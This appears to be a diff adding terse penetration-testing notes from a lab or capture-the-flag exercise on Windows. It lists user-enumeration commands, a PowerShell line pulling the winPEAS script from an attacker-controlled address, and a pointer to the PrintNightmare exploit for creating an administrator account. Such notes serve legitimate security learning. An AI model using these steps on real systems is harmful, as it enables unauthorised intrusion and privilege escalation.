@@ -1,0 +1,8 @@
+CMD commands : 
+wmic useraccount get name,sid # print username of current machine alongwith sid and name of computer
+net users ## will list all users
+
+wget in windows : Invoke-WebRequest "http://10.10.16.9/winPEAS.bat" -o winpeas.bat
+
+then : ps 
+we can see spoolsv is running => printer cve for privilege escalation: allow us to create new user with adminsitrator privileges : https://github.com/calebstewart/CVE-2021-1675
